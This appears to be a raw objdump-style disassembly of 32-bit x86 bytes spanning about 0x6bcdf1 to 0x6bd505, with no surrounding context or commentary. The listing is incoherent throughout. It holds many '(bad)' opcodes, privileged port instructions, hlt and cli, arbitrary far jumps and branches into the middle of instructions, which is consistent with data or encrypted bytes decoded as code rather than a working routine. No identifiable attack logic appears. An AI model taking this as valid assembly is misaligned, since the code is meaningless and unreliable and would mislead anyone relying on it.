  6bcdf1:	mov    al,0xa8
  6bcdf3:	out    dx,al
  6bcdf4:	es jle 0x6bce76
  6bcdf7:	clc    
  6bcdf8:	std    
  6bcdf9:	aam    0x53
  6bcdfb:	jbe    0x6bce5c
  6bcdfd:	adc    edx,ebx
  6bcdff:	test   al,0x1e
  6bce01:	push   0xbb2ea051
  6bce06:	lahf   
  6bce07:	push   0xffffffe6
  6bce09:	nop
  6bce0a:	xchg   BYTE PTR [eax-0x529e4a90],ch
  6bce10:	adc    BYTE PTR [edx+0x41d3ebdd],dh
  6bce16:	mov    bl,0xe0
  6bce18:	pop    esp
  6bce19:	dec    edi
  6bce1a:	xor    eax,0x45e94637
  6bce1f:	and    cl,bh
  6bce21:	fwait
  6bce22:	mov    ds:0xf73364e1,eax
  6bce27:	hlt    
  6bce28:	adc    edx,eax
  6bce2a:	mov    dl,BYTE PTR fs:[ecx+eiz*8-0x21]
  6bce2f:	ja     0x6bce23
  6bce31:	push   0x1d
  6bce33:	fldenv [ebx]
  6bce35:	add    al,0x21
  6bce37:	rol    DWORD PTR [edx+0x56],1
  6bce3a:	call   DWORD PTR [ebx-0x58]
  6bce3d:	call   0x4375:0x650f0db8
  6bce44:	lods   eax,DWORD PTR ds:[esi]
  6bce45:	xor    ebp,DWORD PTR [eax-0x3b]
  6bce48:	rcl    DWORD PTR [esi+0x44],1
  6bce4b:	jg     0x6bce29
  6bce4d:	dec    edx
  6bce4e:	push   0xe937fae5
  6bce53:	mov    ch,0xd4
  6bce55:	push   0x73f894b1
  6bce5a:	enter  0x8d84,0xdb
  6bce5e:	call   0x6319694e
  6bce63:	adc    BYTE PTR ds:0x3d8cbc4e,bh
  6bce69:	sbb    DWORD PTR [edx-0x575ce01e],ecx
  6bce6f:	jmp    esp
  6bce71:	sbb    bh,cl
  6bce73:	(bad)  
  6bce75:	in     al,0xe1
  6bce77:	leave  
  6bce78:	nop
  6bce79:	xor    edi,DWORD PTR [ecx-0x67d7d6c5]
  6bce7f:	xchg   ebp,eax
  6bce80:	rol    DWORD PTR [esi-0x27],cl
  6bce83:	jl     0x6bceb4
  6bce85:	retf   0x9c98
  6bce88:	cmp    eax,0x9af72893
  6bce8d:	dec    edx
  6bce8e:	jmp    0x6bce86
  6bce90:	dec    edx
  6bce91:	stc    
  6bce92:	cs cmp eax,0x136edb11
  6bce98:	dec    eax
  6bce99:	cli    
  6bce9a:	stos   BYTE PTR es:[edi],al
  6bce9b:	adc    ebp,DWORD PTR [eax+0x58]
  6bce9e:	sbb    eax,0x832c6ea1
  6bcea3:	sbb    esi,DWORD PTR [esi]
  6bcea5:	stc    
  6bcea6:	xchg   esi,eax
  6bcea7:	adc    dl,BYTE PTR [esi+0x54]
  6bceaa:	adc    al,0xdf
  6bceac:	mov    bh,0x14
  6bceae:	aas    
  6bceaf:	pop    ds
  6bceb0:	je     0x6bcefb
  6bceb2:	push   0x6ba809e0
  6bceb7:	ss sbb al,0x18
  6bceba:	inc    edx
  6bcebb:	xchg   BYTE PTR [eax],ah
  6bcebd:	sbb    edx,DWORD PTR [ebx]
  6bcebf:	pop    edi
  6bcec0:	test   al,0x6b
  6bcec2:	imul   ebx,DWORD PTR [ebx],0x5a
  6bcec5:	inc    esp
  6bcec6:	and    edx,DWORD PTR [edx+0x316151b0]
  6bcecc:	out    dx,eax
  6bcecd:	dec    ebp
  6bcece:	sbb    eax,0x4b865c99
  6bced3:	adc    BYTE PTR [eax+0x1b871510],dl
  6bced9:	daa    
  6bceda:	inc    ebp
  6bcedb:	pop    ecx
  6bcedc:	(bad)  
  6bcedd:	out    dx,al
  6bcede:	pop    esp
  6bcedf:	retf   
  6bcee0:	pushf  
  6bcee1:	mov    dl,0x9b
  6bcee3:	sub    DWORD PTR [ebx-0x56],ecx
  6bcee6:	(bad)  
  6bcee7:	cmc    
  6bcee8:	out    dx,al
  6bcee9:	xchg   edi,eax
  6bceea:	and    esp,DWORD PTR [ebp+0x40]
  6bceed:	pop    es
  6bceee:	(bad)  
  6bceef:	hlt    
  6bcef0:	or     al,BYTE PTR ds:0x44a50639
  6bcef6:	mov    ebx,0xb3509de0
  6bcefb:	cmc    
  6bcefc:	shl    esi,1
  6bcefe:	popf   
  6bceff:	xchg   ebx,eax
  6bcf00:	lds    ebx,FWORD PTR [edx+edx*4-0x22b1775a]
  6bcf07:	mov    WORD PTR [ecx+0x57],ds
  6bcf0a:	cmp    eax,0xe7ac7a5f
  6bcf0f:	dec    eax
  6bcf10:	retf   
  6bcf11:	sbb    esi,0xc5cd18c8
  6bcf17:	aam    0x74
  6bcf19:	loope  0x6bcf5b
  6bcf1b:	push   eax
  6bcf1c:	adc    bl,al
  6bcf1e:	jno    0x6bcf9c
  6bcf20:	mov    esp,0xb599f84a
  6bcf25:	xor    esp,DWORD PTR [ecx-0x34]
  6bcf28:	test   DWORD PTR [edi-0x18],edx
  6bcf2b:	in     eax,0x3c
  6bcf2d:	(bad)  
  6bcf2e:	or     al,0x47
  6bcf30:	sbb    DWORD PTR [ebp+0x3b],0x44065f58
  6bcf37:	inc    ebx
  6bcf38:	jle    0x6bcf2a
  6bcf3a:	imul   edx,DWORD PTR [ecx+0x36ef6eb9],0x79
  6bcf41:	shl    DWORD PTR [edi-0xd],cl
  6bcf44:	(bad)  [ecx-0x10e3d50b]
  6bcf4a:	mov    esp,0x52915ecb
  6bcf4f:	push   edx
  6bcf50:	imul   edx,DWORD PTR [ebx+0x40de82fc],0xefa61957
  6bcf5a:	js     0x6bcf93
  6bcf5c:	call   0xf1db88c3
  6bcf61:	rol    BYTE PTR [eax],1
  6bcf63:	jnp    0x6bcf7c
  6bcf65:	aas    
  6bcf66:	pop    eax
  6bcf67:	mov    esi,DWORD PTR [ecx]
  6bcf69:	mov    edx,0x5d59fd86
  6bcf6e:	pop    eax
  6bcf6f:	push   eax
  6bcf70:	cdq    
  6bcf71:	icebp  
  6bcf72:	inc    edx
  6bcf73:	pop    ss
  6bcf74:	in     eax,0xfd
  6bcf76:	jno    0x6bcff1
  6bcf78:	mov    eax,ds:0x7751974b
  6bcf7d:	sub    eax,DWORD PTR [ebp-0x53]
  6bcf80:	out    dx,al
  6bcf81:	jnp    0x6bcfd0
  6bcf83:	aaa    
  6bcf84:	or     DWORD PTR [ebx+edx*4+0x3a],ecx
  6bcf88:	in     eax,dx
  6bcf89:	mov    ecx,?
  6bcf8b:	imul   ecx,DWORD PTR [eax-0x5ef19e],0x3917a0ed
  6bcf95:	inc    edx
  6bcf96:	rcl    DWORD PTR [ecx+0x4],1
  6bcf99:	sub    al,bh
  6bcf9b:	or     BYTE PTR [ebp-0x60],0x34
  6bcf9f:	push   esi
  6bcfa0:	mov    eax,0x4793640c
  6bcfa5:	inc    esp
  6bcfa6:	pop    ebx
  6bcfa7:	sbb    dh,BYTE PTR [eax-0x32]
  6bcfaa:	sub    DWORD PTR [ecx+0x2],0xd5ef4639
  6bcfb1:	imul   ebp,eax,0x749d96aa
  6bcfb7:	cmp    edx,DWORD PTR [ebx+0x4882fedd]
  6bcfbd:	test   eax,0x395ecba9
  6bcfc2:	add    ebx,DWORD PTR [ebp-0xd737c29]
  6bcfc8:	inc    esi
  6bcfc9:	sub    ch,BYTE PTR [eax-0x2fccd4e4]
  6bcfcf:	pop    esi
  6bcfd0:	out    dx,al
  6bcfd1:	push   edi
  6bcfd2:	stos   DWORD PTR es:[edi],eax
  6bcfd3:	enter  0x6eb1,0x5d
  6bcfd7:	repnz push eax
  6bcfd9:	sbb    eax,0xf7fea2da
  6bcfde:	jne    0x6bcfe9
  6bcfe0:	or     al,0x6b
  6bcfe2:	das    
  6bcfe3:	and    al,BYTE PTR [ecx]
  6bcfe5:	adc    DWORD PTR [ecx-0x65],edi
  6bcfe8:	mov    ah,ch
  6bcfea:	and    eax,0x7d6825
  6bcfef:	dec    esp
  6bcff0:	pop    eax
  6bcff1:	mov    WORD PTR [ebp-0x51],?
  6bcff4:	mov    dl,0x85
  6bcff6:	adc    eax,0xc8b68cd8
  6bcffb:	jge    0x6bcf88
  6bcffd:	inc    dx
  6bcfff:	adc    al,BYTE PTR [esi+0x23]
  6bd002:	add    al,0x70
  6bd004:	lods   al,BYTE PTR ds:[esi]
  6bd005:	enterw 0x215,0x94
  6bd00a:	cli    
  6bd00b:	rol    DWORD PTR [edi+0x796fd0b0],0x83
  6bd012:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bd013:	cmp    eax,0xe797ad77
  6bd018:	test   BYTE PTR ds:0xd81bff95,bl
  6bd01e:	js     0x6bcffa
  6bd020:	and    ebx,DWORD PTR [edi+edi*4]
  6bd023:	dec    esp
  6bd024:	jle    0x6bd061
  6bd026:	daa    
  6bd027:	xor    ebx,DWORD PTR [eax+0x50222168]
  6bd02d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6bd02e:	add    BYTE PTR [edx-0x6da4d353],cl
  6bd034:	or     al,0x12
  6bd036:	ret    0x865
  6bd039:	clc    
  6bd03a:	data16 xor ah,BYTE PTR [esi+ecx*8+0x771214b7]
  6bd042:	push   0xffffffbf
  6bd044:	jle    0x6bcfc6
  6bd046:	test   al,0x91
  6bd048:	sbb    eax,0x7e637002
  6bd04d:	mov    ebp,0x3f3fe0ef
  6bd052:	add    DWORD PTR [ecx+0x6a],eax
  6bd055:	xchg   esp,eax
  6bd056:	mov    esp,esp
  6bd058:	out    dx,al
  6bd059:	pop    ecx
  6bd05a:	int3   
  6bd05b:	pop    edx
  6bd05c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6bd05d:	stos   BYTE PTR es:[edi],al
  6bd05e:	fisttp QWORD PTR [ebp+edx*1-0x6f]
  6bd062:	in     al,dx
  6bd063:	neg    DWORD PTR [edx-0x1a]
  6bd066:	sbb    dh,BYTE PTR [edx-0xe]
  6bd069:	rcr    DWORD PTR [eax-0x5ec5e70b],cl
  6bd06f:	or     al,0x6b
  6bd071:	push   es
  6bd072:	loopne 0x6bd0ee
  6bd074:	push   ds
  6bd075:	and    cl,BYTE PTR [ebx]
  6bd077:	xchg   ebp,eax
  6bd078:	stos   BYTE PTR es:[edi],al
  6bd079:	je     0x6bd022
  6bd07b:	cmp    DWORD PTR [ebp+0x73],esp
  6bd07e:	xchg   ebx,eax
  6bd07f:	sbb    dh,dh
  6bd081:	cmp    DWORD PTR [edx+0x745ecbea],esp
  6bd087:	cmp    ebx,DWORD PTR [edi]
  6bd089:	fsubr  DWORD PTR [esi]
  6bd08b:	jp     0x6bd10c
  6bd08d:	fcom   DWORD PTR [eax+0x30]
  6bd090:	ins    DWORD PTR es:[edi],dx
  6bd091:	test   eax,0x35659a91
  6bd096:	mov    ah,0xd9
  6bd098:	int    0xe3
  6bd09a:	popa   
  6bd09b:	push   cs
  6bd09c:	mov    ds:0xbcb7cb28,eax
  6bd0a1:	ret    
  6bd0a2:	leave  
  6bd0a3:	ret    
  6bd0a4:	pop    ecx
  6bd0a5:	ret    0x4869
  6bd0a8:	test   al,0x6d
  6bd0aa:	imul   edi,DWORD PTR [ebp+0x42],0x48
  6bd0ae:	dec    eax
  6bd0af:	cmp    al,0x17
  6bd0b1:	test   eax,0xce1d08fd
  6bd0b6:	sub    ebp,DWORD PTR [eax+0x2b]
  6bd0b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bd0ba:	fist   WORD PTR [eax-0x55]
  6bd0bd:	sbb    cl,dl
  6bd0bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bd0c0:	sbb    eax,DWORD PTR [edi]
  6bd0c2:	and    ch,BYTE PTR [ebp-0x5a]
  6bd0c5:	adc    BYTE PTR [edx],ah
  6bd0c7:	inc    edi
  6bd0c8:	dec    edx
  6bd0c9:	and    eax,0xee616c27
  6bd0ce:	loope  0x6bd067
  6bd0d0:	or     al,0x15
  6bd0d2:	pop    ebp
  6bd0d3:	test   BYTE PTR [edx-0x438ae4cf],cl
  6bd0d9:	cmp    dh,BYTE PTR [ebx-0x4b]
  6bd0dc:	js     0x53ca766c
  6bd0e2:	dec    esp
  6bd0e4:	adc    ch,BYTE PTR [ebp-0x489003c6]
  6bd0ea:	je     0x6bd10c
  6bd0ec:	shl    BYTE PTR [ebx],cl
  6bd0ee:	cmp    esp,ebx
  6bd0f0:	cli    
  6bd0f1:	xchg   edi,eax
  6bd0f2:	dec    esp
  6bd0f3:	repz aam 0x70
  6bd0f6:	inc    edi
  6bd0f7:	loop   0x6bd13e
  6bd0f9:	rol    BYTE PTR [esi-0x17be5893],0x6e
  6bd100:	sub    DWORD PTR [edx-0x5b],esi
  6bd103:	sub    eax,0xffffffd6
  6bd106:	push   0x69
  6bd108:	cwde   
  6bd109:	or     BYTE PTR [ebp-0x7ad84bc4],dl
  6bd10f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6bd110:	sbb    al,0x5f
  6bd112:	icebp  
  6bd113:	arpl   WORD PTR [ebp+0x6db026da],si
  6bd119:	rol    DWORD PTR [ebp+eiz*4+0x3e],0x9d
  6bd11e:	popf   
  6bd11f:	dec    edx
  6bd120:	jmp    0x2b08c091
  6bd125:	add    eax,0x90c9ddd3
  6bd12a:	arpl   WORD PTR [esp+ebx*2-0x7cc41855],di
  6bd131:	test   DWORD PTR [esi],ebx
  6bd133:	cmp    edx,DWORD PTR [esi-0x399743c1]
  6bd139:	cmp    DWORD PTR [esi],esi
  6bd13b:	mov    ebp,ecx
  6bd13d:	xchg   ecx,eax
  6bd13e:	sbb    ah,dl
  6bd140:	test   BYTE PTR [ebx-0xffb9a0a],bl
  6bd146:	adc    BYTE PTR [edx],dh
  6bd148:	and    DWORD PTR [eax],esi
  6bd14a:	scas   al,BYTE PTR es:[edi]
  6bd14b:	and    DWORD PTR [esi+esi*2-0x473260c9],ebp
  6bd152:	adc    eax,0xfee79850
  6bd157:	push   eax
  6bd158:	and    ah,BYTE PTR [esi+ebx*8]
  6bd15b:	ja     0x6bd164
  6bd15d:	add    esi,ebp
  6bd15f:	push   0x6a
  6bd161:	je     0x6bd1ca
  6bd163:	xor    al,0x7d
  6bd165:	and    BYTE PTR [edi+0x60daaa8c],cl
  6bd16b:	dec    ecx
  6bd16c:	int3   
  6bd16d:	jnp    0x6bd1e3
  6bd16f:	gs and edx,esi
  6bd172:	pusha  
  6bd173:	jmp    0x6bd137
  6bd175:	inc    esi
  6bd176:	and    DWORD PTR [ecx],0xffffffdf
  6bd179:	lahf   
  6bd17a:	or     eax,0x68e67d01
  6bd17f:	call   0xca96937a
  6bd184:	popa   
  6bd185:	dec    edx
  6bd186:	add    bh,BYTE PTR [edi]
  6bd188:	(bad)  
  6bd189:	adc    BYTE PTR [ebp+0x3e],dl
  6bd18c:	out    dx,eax
  6bd18d:	ja     0x6bd11b
  6bd18f:	sbb    eax,esp
  6bd191:	mov    edi,eax
  6bd193:	mov    bl,0x74
  6bd195:	cwde   
  6bd196:	push   ecx
  6bd197:	mov    eax,ds:0xa476ee95
  6bd19c:	mov    edi,ebx
  6bd19e:	and    edx,ebx
  6bd1a0:	jns    0x6bd14d
  6bd1a2:	test   al,0xb4
  6bd1a4:	dec    eax
  6bd1a5:	into   
  6bd1a6:	lds    ebp,FWORD PTR [esi]
  6bd1a8:	mov    eax,ds:0x58929c8c
  6bd1ad:	mov    ds,WORD PTR [edi+0x27]
  6bd1b0:	loope  0x6bd146
  6bd1b2:	mov    fs,WORD PTR [edx+0x60d21dd6]
  6bd1b8:	adc    eax,0x9d45428f
  6bd1bd:	clc    
  6bd1be:	sbb    eax,0x12d59de6
  6bd1c3:	xchg   edi,eax
  6bd1c4:	js     0x6bd1d5
  6bd1c6:	dec    ecx
  6bd1c7:	sub    edi,edi
  6bd1c9:	iret   
  6bd1ca:	adc    ch,BYTE PTR [esi]
  6bd1cc:	gs iret 
  6bd1ce:	and    DWORD PTR [eax+0x3f8f1c89],edx
  6bd1d4:	ss push eax
  6bd1d6:	mov    edx,0xf841f072
  6bd1db:	mov    eax,0x475b9447
  6bd1e0:	add    DWORD PTR [edx+ecx*2],0xffffffdf
  6bd1e4:	jmp    0x414b:0xa86ec2c5
  6bd1eb:	jmp    0x5001b239
  6bd1f0:	jecxz  0x6bd244
  6bd1f2:	icebp  
  6bd1f3:	mov    ebp,0x42030cb3
  6bd1f8:	or     ah,ch
  6bd1fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bd1fb:	jmp    0x6bd1ed
  6bd1fd:	fild   DWORD PTR [ebx-0x455dba61]
  6bd203:	and    al,0x63
  6bd205:	mov    eax,ds:0x375713e9
  6bd20a:	pop    ebp
  6bd20b:	(bad)  
  6bd20c:	fsubp  st(6),st
  6bd20e:	ret    
  6bd20f:	mov    al,ds:0x81e132dc
  6bd214:	pop    esp
  6bd215:	(bad)  
  6bd216:	ds or  al,0x65
  6bd219:	adc    eax,0x2e0b7e71
  6bd21e:	xchg   esp,eax
  6bd21f:	add    ch,ch
  6bd221:	imul   ecx,DWORD PTR [ecx],0xe652e675
  6bd227:	sbb    eax,0x22a0975f
  6bd22c:	xor    DWORD PTR [ecx-0x468308f7],edx
  6bd232:	cdq    
  6bd233:	lods   eax,DWORD PTR ds:[esi]
  6bd234:	jns    0x6bd1ea
  6bd236:	fyl2x  
  6bd238:	mov    eax,0xc43a4d79
  6bd23d:	xchg   ecx,eax
  6bd23e:	push   ebp
  6bd23f:	and    ebp,DWORD PTR [eax+edi*1-0x57]
  6bd243:	mov    al,ds:0x870b0df4
  6bd248:	push   ecx
  6bd249:	fstp   DWORD PTR [ecx-0x4994a589]
  6bd24f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6bd250:	clc    
  6bd251:	mov    ?,ecx
  6bd253:	shl    esp,0xf7
  6bd256:	popa   
  6bd257:	(bad)  
  6bd258:	sti    
  6bd259:	repnz add esi,DWORD PTR [ebx]
  6bd25c:	dec    ecx
  6bd25d:	cli    
  6bd25e:	int3   
  6bd25f:	lods   al,BYTE PTR ds:[esi]
  6bd260:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bd261:	xchg   edi,ebp
  6bd263:	inc    edx
  6bd264:	(bad)  
  6bd265:	xor    esp,DWORD PTR [eax+0x3]
  6bd268:	scas   al,BYTE PTR es:[edi]
  6bd269:	jo     0x6bd281
  6bd26b:	xor    bl,dl
  6bd26d:	xor    ah,BYTE PTR [eax]
  6bd26f:	sti    
  6bd270:	not    cl
  6bd272:	adc    eax,0xdb1b9a81
  6bd277:	mov    edi,0xbf6b9b95
  6bd27c:	inc    ebx
  6bd27d:	ss mov bh,dh
  6bd280:	inc    ebp
  6bd281:	mov    al,0xf2
  6bd283:	sbb    eax,0x4564cf72
  6bd288:	jne    0x6bd2c4
  6bd28a:	(bad)  
  6bd28b:	mov    esp,0x652b2ceb
  6bd290:	(bad)  
  6bd292:	(bad)  
  6bd293:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bd294:	xchg   edi,eax
  6bd295:	mov    dl,0x35
  6bd297:	sub    ch,ch
  6bd299:	xchg   esi,eax
  6bd29a:	cli    
  6bd29b:	sti    
  6bd29c:	fisubr WORD PTR [ebx+ebp*2]
  6bd29f:	ins    DWORD PTR es:[edi],dx
  6bd2a0:	mov    al,0xcb
  6bd2a2:	push   es
  6bd2a3:	jl     0x6bd284
  6bd2a5:	cmc    
  6bd2a6:	xor    eax,0x51d27fd0
  6bd2ab:	xor    ecx,DWORD PTR [ebx+edi*2+0x37fdaae8]
  6bd2b2:	mov    bh,BYTE PTR [esi-0x24]
  6bd2b5:	cld    
  6bd2b6:	out    0xa9,al
  6bd2b8:	nop
  6bd2b9:	xchg   esi,eax
  6bd2ba:	adc    cl,bl
  6bd2bc:	cmp    al,0x91
  6bd2be:	mov    al,ds:0x32d3c6fa
  6bd2c3:	(bad)  
  6bd2c4:	clc    
  6bd2c5:	mov    dl,0x7c
  6bd2c7:	mov    eax,ds:0xacd8403c
  6bd2cc:	subps  xmm5,XMMWORD PTR [ebp-0x40]
  6bd2d0:	jno    0x6bd316
  6bd2d2:	jo     0x6bd33a
  6bd2d4:	fcom   st(4)
  6bd2d6:	outs   dx,DWORD PTR ds:[esi]
  6bd2d7:	mov    cl,0xb9
  6bd2d9:	int3   
  6bd2da:	sbb    eax,0x975fca65
  6bd2df:	sub    eax,0xad36cbaf
  6bd2e4:	and    dl,BYTE PTR [eax+0x7f]
  6bd2e7:	sub    eax,0xd1f87546
  6bd2ec:	xor    esi,ebp
  6bd2ee:	or     dh,cl
  6bd2f0:	sub    eax,DWORD PTR [ebx]
  6bd2f2:	stos   BYTE PTR es:[edi],al
  6bd2f3:	push   eax
  6bd2f4:	jbe    0x6bd35e
  6bd2f6:	or     ch,BYTE PTR [eax+0x11c02627]
  6bd2fc:	mov    edi,0xb05035e0
  6bd301:	imul   ebx,esi,0x2ede2deb
  6bd307:	clc    
  6bd308:	neg    bh
  6bd30a:	mov    ds:0xfd3ed880,al
  6bd30f:	pop    ebp
  6bd310:	push   0x72
  6bd312:	shl    esp,1
  6bd314:	add    dh,ch
  6bd316:	jg     0x6bd302
  6bd318:	repnz int 0x84
  6bd31b:	repz and ebx,eax
  6bd31e:	dec    ecx
  6bd31f:	push   es
  6bd320:	aad    0x54
  6bd322:	fwait
  6bd323:	adc    eax,0x8c9e65e9
  6bd328:	imul   esi,DWORD PTR [edi+0x2e],0xfffffff1
  6bd32c:	mov    ah,0x2b
  6bd32e:	jmp    0x2598a55
  6bd333:	(bad)  
  6bd334:	(bad)  
  6bd335:	jmp    0x6bd325
  6bd337:	mov    esi,0x62820c53
  6bd33c:	pusha  
  6bd33d:	stos   DWORD PTR es:[edi],eax
  6bd33e:	cmp    eax,0x4736a7cb
  6bd343:	inc    esi
  6bd344:	lahf   
  6bd345:	cdq    
  6bd346:	jae    0x6bd2e3
  6bd348:	push   ds
  6bd349:	xchg   ebp,eax
  6bd34a:	jnp    0x6bd385
  6bd34c:	inc    edx
  6bd34d:	fs leave 
  6bd34f:	cld    
  6bd350:	xchg   DWORD PTR [edi],ecx
  6bd352:	pop    edx
  6bd353:	bound  eax,QWORD PTR [ebp+0x36]
  6bd356:	in     al,0x37
  6bd358:	inc    esp
  6bd359:	daa    
  6bd35a:	pop    esp
  6bd35b:	pusha  
  6bd35c:	cmp    BYTE PTR [ebx+0x3a],0xad
  6bd360:	pop    es
  6bd361:	cmp    al,0xb7
  6bd363:	ja     0x6bd37a
  6bd365:	mov    al,ds:0xe9ece20e
  6bd36a:	jl     0x6bd350
  6bd36c:	pop    edi
  6bd36d:	and    BYTE PTR [esi+esi*4+0x2c],cl
  6bd371:	in     eax,0xec
  6bd373:	push   cs
  6bd374:	sbb    eax,0xfbd2e78a
  6bd379:	test   DWORD PTR ds:0x5645e644,edx
  6bd37f:	push   ss
  6bd380:	mov    DWORD PTR [edi-0x1f5b3131],esp
  6bd386:	mov    DWORD PTR [esi+0x292f343c],ebp
  6bd38c:	test   BYTE PTR [esp+esi*1+0x50],dh
  6bd390:	out    dx,al
  6bd391:	popf   
  6bd392:	stos   BYTE PTR es:[edi],al
  6bd393:	ror    DWORD PTR [ebx-0x78b33ed3],cl
  6bd399:	sub    DWORD PTR [ebp+0x26],ebp
  6bd39c:	dec    ebx
  6bd39d:	mov    dh,0x4d
  6bd39f:	push   0x5f
  6bd3a1:	sub    BYTE PTR ss:[esi+edi*2-0x670a3d7c],ah
  6bd3a9:	inc    ebp
  6bd3aa:	lahf   
  6bd3ab:	jo     0x6bd3e2
  6bd3ad:	jbe    0x6bd339
  6bd3af:	xor    al,0xeb
  6bd3b1:	xor    al,0xc0
  6bd3b3:	in     al,dx
  6bd3b4:	adc    al,0xda
  6bd3b6:	les    edx,FWORD PTR [esi+0xf]
  6bd3b9:	dec    esp
  6bd3ba:	repnz lods eax,DWORD PTR ds:[esi]
  6bd3bc:	ret    
  6bd3bd:	mov    ds:0x1530ff47,eax
  6bd3c2:	mov    es,edx
  6bd3c4:	cwde   
  6bd3c5:	dec    edx
  6bd3c6:	push   eax
  6bd3c7:	xchg   ebx,eax
  6bd3c8:	retf   0x301a
  6bd3cb:	xor    eax,0x1ba0ece7
  6bd3d0:	cmc    
  6bd3d1:	clc    
  6bd3d2:	outs   dx,DWORD PTR ds:[esi]
  6bd3d3:	int3   
  6bd3d4:	loopne 0x6bd35e
  6bd3d6:	sbb    BYTE PTR [eax+edx*1],cl
  6bd3d9:	cmp    dh,BYTE PTR [edi+0xb00c745]
  6bd3df:	shl    DWORD PTR [ebp+0x55],1
  6bd3e2:	mov    ds:0xd9cc71a2,eax
  6bd3e7:	add    cl,al
  6bd3e9:	jbe    0x6bd410
  6bd3eb:	ins    DWORD PTR es:[edi],dx
  6bd3ec:	inc    eax
  6bd3ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bd3ee:	inc    edi
  6bd3ef:	retf   
  6bd3f0:	cli    
  6bd3f1:	jle    0x6bd43d
  6bd3f3:	xor    BYTE PTR [edx+ebx*4],0xb0
  6bd3f7:	ins    BYTE PTR es:[edi],dx
  6bd3f8:	push   esp
  6bd3f9:	stc    
  6bd3fa:	inc    ebp
  6bd3fb:	inc    eax
  6bd3fc:	pop    ebx
  6bd3fd:	pop    ebx
  6bd3fe:	call   0x932cf91c
  6bd403:	push   cs
  6bd404:	mov    DWORD PTR [ebx],eax
  6bd406:	int3   
  6bd407:	mov    ch,0x1e
  6bd409:	adc    DWORD PTR [ebp+0x20],eax
  6bd40c:	std    
  6bd40d:	mov    ebx,0x16ab85a0
  6bd412:	sbb    ch,BYTE PTR [esi-0x6]
  6bd415:	cmc    
  6bd416:	push   cs
  6bd417:	mov    ds:0xaf3c1259,eax
  6bd41c:	pop    edx
  6bd41d:	inc    edi
  6bd41e:	inc    eax
  6bd41f:	(bad)  
  6bd420:	clc    
  6bd421:	outs   dx,BYTE PTR ds:[esi]
  6bd422:	mov    bh,0x4f
  6bd424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bd425:	stos   DWORD PTR es:[edi],eax
  6bd426:	push   esi
  6bd427:	push   esp
  6bd428:	int3   
  6bd429:	mov    eax,0x756ef243
  6bd42e:	xor    eax,0xcaaa6ce9
  6bd433:	mov    esi,cs
  6bd435:	mov    eax,ds:0x73893dba
  6bd43a:	div    BYTE PTR [eax+0x2bd6ae3c]
  6bd440:	and    BYTE PTR [ebx],ah
  6bd442:	xchg   esi,eax
  6bd443:	test   BYTE PTR [ecx-0x51],0x1d
  6bd447:	adc    ebp,DWORD PTR [edi-0x3e]
  6bd44a:	ds pop es
  6bd44c:	sub    ch,BYTE PTR [ecx+0x31b5c137]
  6bd452:	mov    ch,0x35
  6bd454:	mov    ebp,0x6e62d269
  6bd459:	mov    bh,0xee
  6bd45b:	out    dx,al
  6bd45c:	or     DWORD PTR ds:0xca8651b0,edx
  6bd462:	xor    ecx,DWORD PTR [ecx]
  6bd464:	(bad)  
  6bd465:	ja     0x6bd4af
  6bd467:	inc    ebx
  6bd468:	clc    
  6bd469:	and    BYTE PTR [ebx-0x66],ah
  6bd46c:	xchg   ebp,eax
  6bd46d:	cmp    ebx,ebx
  6bd46f:	pop    edx
  6bd470:	dec    ebp
  6bd471:	in     al,dx
  6bd472:	test   BYTE PTR [ebp+0x7],0xc3
  6bd476:	mov    eax,ds:0xad38a173
  6bd47b:	cmp    BYTE PTR [eax-0xa],bl
  6bd47e:	mov    edx,esi
  6bd480:	out    dx,eax
  6bd481:	jns    0x6bd41b
  6bd483:	push   edi
  6bd484:	ret    0x3b88
  6bd487:	fist   DWORD PTR [esi]
  6bd489:	test   BYTE PTR [esi+0x289b5b0e],0xea
  6bd490:	pop    edi
  6bd491:	cli    
  6bd492:	mov    al,ds:0xdbe0c707
  6bd497:	das    
  6bd498:	ins    BYTE PTR es:[edi],dx
  6bd499:	jp     0x6bd50d
  6bd49b:	dec    edi
  6bd49c:	js     0x6bd47a
  6bd49e:	push   0xfffffff4
  6bd4a0:	jae    0x6bd4f1
  6bd4a2:	xacquire xchg DWORD PTR [ebp+0x59cbe56e],ecx
  6bd4a9:	ret    
  6bd4aa:	repz ror dh,0x23
  6bd4ae:	xchg   ecx,eax
  6bd4af:	pushf  
  6bd4b0:	shr    BYTE PTR cs:[esi-0x6a06767a],1
  6bd4b7:	fwait
  6bd4b8:	mov    bl,0xc
  6bd4ba:	add    eax,0xd802f824
  6bd4bf:	cmp    ebx,esp
  6bd4c1:	cmp    DWORD PTR [eax-0x7c],ebx
  6bd4c4:	or     BYTE PTR [ecx+0x586abfd4],dl
  6bd4ca:	aas    
  6bd4cb:	xor    eax,ecx
  6bd4cd:	mov    dl,0xaf
  6bd4cf:	jo     0x6bd52c
  6bd4d1:	inc    edx
  6bd4d2:	or     al,0xbc
  6bd4d4:	dec    ecx
  6bd4d5:	jbe    0x6bd4bc
  6bd4d7:	clc    
  6bd4d8:	mov    bl,0x44
  6bd4da:	retf   0x1ac4
  6bd4dd:	xchg   esi,eax
  6bd4de:	stc    
  6bd4df:	jb     0x6bd47c
  6bd4e1:	int3   
  6bd4e2:	aas    
  6bd4e3:	inc    edi
  6bd4e4:	pop    esp
  6bd4e5:	jmp    0x31f7:0x86d4d4f
  6bd4ec:	ss ins BYTE PTR es:[edi],dx
  6bd4ee:	daa    
  6bd4ef:	lahf   
  6bd4f0:	call   0x6067:0x54f42bf3
  6bd4f7:	inc    eax
  6bd4f8:	je     0x6bd508
  6bd4fa:	jmp    0x9ee228e
  6bd4ff:	fst    QWORD PTR [ecx]
  6bd501:	out    dx,eax
  6bd502:	lods   al,BYTE PTR ds:[esi]
  6bd503:	imul   bh
  6bd505:	and    DWORD PTR [ecx],edx
